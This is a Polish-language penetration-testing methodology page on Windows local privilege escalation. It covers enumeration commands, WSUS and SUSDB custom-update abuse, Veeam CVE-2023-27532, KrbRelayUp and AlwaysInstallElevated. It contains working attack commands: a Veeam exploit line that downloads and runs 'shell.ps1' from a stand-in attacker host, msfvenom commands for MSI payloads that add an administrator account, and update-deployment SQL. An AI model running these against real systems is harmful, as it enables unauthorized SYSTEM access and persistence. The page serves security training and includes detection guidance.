# Lokalna eskalacja uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Przedstawiony tu praktyczny proces enumeracji opiera się również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały o historycznych atakach obejmują prezentację DerbyCon poświęconą eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są access tokens w Windows, przeczytaj poniższą stronę, zanim przejdziesz dalej:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na poniższej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przeczytaj poniższą stronę, zanim przejdziesz dalej:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji na potrzeby eskalacji uprawnień **przeczytaj** poniższą **stronę** i **sprawdź** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić przekształcenie modyfikacji UEFI NVRAM w trybie offline w łańcuch ataku obejmujący DMA przed uruchomieniem systemu i modyfikację pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / ciche podniesienie uprawnień UIAccess

Procesy UIAccess uruchomione przez `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, gdy obejdzie się kontrole bezpiecznych ścieżek AppInfo. Opis dedykowanego procesu obchodzenia UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację wpisów rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę LPE wykorzystującą **dowolny port SMB**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach produktów Microsoft. Ta baza danych zawiera ponad 4 700 luk, co pokazuje **ogromną powierzchnię ataku** środowiska Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnie pasujących biuletynach; przed uznaniem wyniku za pasujący sprawdź dokładny produkt i aktualizacje zastępujące wcześniejsze.

W przypadku lokalnego exploita przeznaczonego dla konkretnej wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym systemie Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, natomiast `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten nie jest dostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego lub brakująca aktualizacja KB nie potwierdzają, że exploit zadziała; porównaj aktualnie uruchomioną kompilację, zainstalowaną aktualizację lub aktualizację ją zastępującą, architekturę procesu oraz wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające/Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub parametr `-OutputDirectory` polecenia `Start-Transcript` mogą przekierować pliki do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i listę ACL pliku: może on zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest tylko wskazówką, jeśli jej zawartość ujawnia dane tożsamości z wyższymi uprawnieniami, których można użyć do logowania w odpowiednim kontekście.

### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym uruchomione polecenia, ich wywołania i fragmenty skryptów. Nie muszą być jednak rejestrowane pełne szczegóły wykonania ani wyniki.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić 15 ostatnich zdarzeń z dzienników PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowany jest pełny przebieg aktywności i pełna treść skryptu podczas jego wykonywania, dzięki czemu każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zapewnia kompleksowy ślad audytowy wszystkich działań, przydatny w analizie kryminalistycznej i badaniu złośliwego zachowania. Dokumentowanie wszystkich działań w chwili ich wykonywania pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Punkt końcowy WSUS korzystający z HTTP to wskazówka, że warto sprawdzić możliwość przechwycenia metadanych aktualizacji. Wykorzystanie tej możliwości zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić lub kontrolować jego ruch oraz jakie zasady zaufania do aktualizacji i ich instalowania obowiązują na kliencie. Sam adres URL nie gwarantuje wykonania kodu. [Firma Microsoft zaleca używanie TLS do przesyłania metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to warunek wstępny dla ścieżki przechwytywania HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji lub instalacja z podwyższonymi uprawnieniami są możliwe. Gdy wartość wynosi `0`, ten konkretny skonfigurowany punkt końcowy WSUS nie jest wybierany przez tę zasadę.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty exploitów MiTM, które wstrzykują „fałszywe” aktualizacje do niezabezpieczonego ruchu WSUS.

Zapoznaj się z badaniami:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo jest to błąd wykorzystywany przez ten exploit:

> Jeśli możemy modyfikować proxy lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno przez HTTP, jak i HTTPS. WSUS nie używa mechanizmów podobnych do HSTS, które implementują walidację typu trust-on-first-use dla certyfikatu. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje kontrolowane przez administratora WSUS

Istnieje odrębna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, która otrzyma zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania przy publikowaniu](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu dla lokalnie publikowanej zawartości. Zanim uznasz to za ścieżkę eskalacji uprawnień, potwierdź, że potencjalna aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowej aktualizacji SUSDB: niepodpisane payloady przez `.txt`/`.esd`

Jest to inne naruszenie granicy zaufania niż przechwytywanie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do publikowania i zatwierdzania niestandardowej aktualizacji. Jedną z praktycznych ścieżek uzyskania dostępu jest przekazanie konta komputera WSUS nadrzędnego serwera do oddzielnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw wylistuj uprawnienia `EXECUTE`, zamiast zakładać konieczność posiadania praw administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o odrębnej ścieżce ataku, która przekazuje uwierzytelnianie klienta WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w [Nadużywanie WSUS HTTP do przekaźnika NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdzenie przekaźnika do zewnętrznej bazy danych i uprawnień do procedur

Wdrożenia, w których WSUS korzysta z zewnętrznego serwera SQL, należy najpierw sprawdzić, czy konto serwera WSUS może uwierzytelnić się w bazie danych i czy przekaźnik NTLM dociera do tego nasłuchującego serwera. Rola SQL serwera może udostępniać procedury publikowania aktualizacji, nawet jeśli bezpośrednie zapisy w tabelach są zabronione; nieudana instrukcja `UPDATE` na `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur w autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicje procedur działających na żywo oraz zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne podczas odtwarzania prawidłowych metadanych aktualizacji. Zarówno nadrzędny pakiet zbiorczy, jak i podrzędny ładunek wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) oraz `ExtendedProperties` (`2`); zapisz lokalny identyfikator rewizji zwrócony przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji pakietu zbiorczego, skrótów, rozmiaru, adresu URL zawartości oraz rewizji. Jest to stanowy proces publikowania, więc pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Utwórz, skieruj i zatwierdź aktualizację

Proces obsługi niestandardowych aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Ważne przejścia między stanami to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Zaimportuj metadane aktualizacji | `spImportUpdate` |
| Zapisz fragmenty XML dotyczące wymagań wstępnych oraz właściwości lokalizowanych i rozszerzonych | `spSaveXMLFragment` |
| Powiąż skrót zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyświetl grupy komputerów lub utwórz grupę i dodaj klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdź instalację dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar oraz obsługa `CommandLineInstallation` muszą być zgodne w importowanych metadanych i fragmentach. Po przypisaniu adresu URL zawartości i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia zamiast ponownie wykorzystywać przykładowe identyfikatory GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Ominięcie weryfikacji podpisu na podstawie rozszerzenia

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, jeśli podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez wcześniejszego sprawdzenia, czy bajty zawierają tekst lub prawidłowy obraz ESD. Dlatego niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę instalacji aktualizacji obsługującą wiersz poleceń. To błąd pomylenia typów/polityki, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Przygotowanie środowiska i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresu bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do wykonania łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do przygotowania zawartości. Minimalne wywołanie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Wykonywanie bez nadzoru i trwałość przez ponawianie prób

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc mechanizm ponawiania prób może zapewnić powtarzalną trwałość przez wykonywanie kodu; jest to jednak głośne, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i metody hardeningu

Przydatne punkty kontroli po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; badaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` oraz `EventId=364`; weryfikację koreluj z rozszerzeniem payloadu i sygnaturą zawartości, zamiast ufać rozszerzeniu.
- Wykrywaj wielokrotne niepowodzenia/ponawianie instalacji przez Windows Update oraz wykonywanie PE lub nieoczekiwaną aktywność procesów potomnych/sieciową z zawartości o nazwach `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy danych do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Aktualizatory innych firm i IPC agentów (lokalne privesc)

Wiele agentów korporacyjnych udostępnia lokalny interfejs IPC oraz uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację na serwerze atakującego, a aktualizator ufa nieuczciwemu głównemu CA lub stosuje słabe kontrole podpisującego, użytkownik lokalny może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie używają podstawowej usługi kopii zapasowych na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych danych uwierzytelniających do bazy konfiguracji w obrębie perymetru sieci kopii zapasowych; odrębny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać poza localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Recon**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie kompletna weryfikacja poprawek.
- **Wersje z poprawką**: Veeam podaje **11a build 11.0.1.1261 P20230227** oraz **12 build 12.0.0.1420 P20230223** jako pierwsze wersje z poprawką; wcześniejsze wersje są podatne. Czteroczłonowy numer wersji pliku sam w sobie nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów kompilacji. Przed uznaniem granicznej kompilacji za poprawioną sprawdź identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie wyzwól payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Przytoczony PoC demonstruje wykonanie poleceń jako SYSTEM, jeśli spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny Kerberos relay może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazany principal ma uprawnienia do obiektu docelowego. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) zarówno zapisy LDAP RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiedniej delegacji i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu poświadczeń klucza oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź faktyczną politykę kontrolera domeny dotyczącą [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu tożsamości poddawanej relay oraz poziomy uwierzytelniania i impersonation wybranej klasy COM. Typ logowania i kontekst poświadczeń wywołującego mają znaczenie: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Routing zapory/OXID i zainstalowane aktualizacje również mogą zmienić wynik. Traktuj liberalną politykę lub pasującą ACL jako obszar wymagający przeglądu; pasywne wyliczanie nie powinno wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta maszyny może prowadzić do uzyskania biletu maszyny, a osobna ścieżka DCSync jest możliwa tylko wtedy, gdy to konto ma wymagane uprawnienia do replikacji katalogu.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz pod adresem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość wynosi **0x1**), użytkownicy o dowolnym poziomie uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję Meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z PowerUP, aby utworzyć w bieżącym katalogu plik binarny MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego potrzebny będzie dostęp do GUI):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten poradnik, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
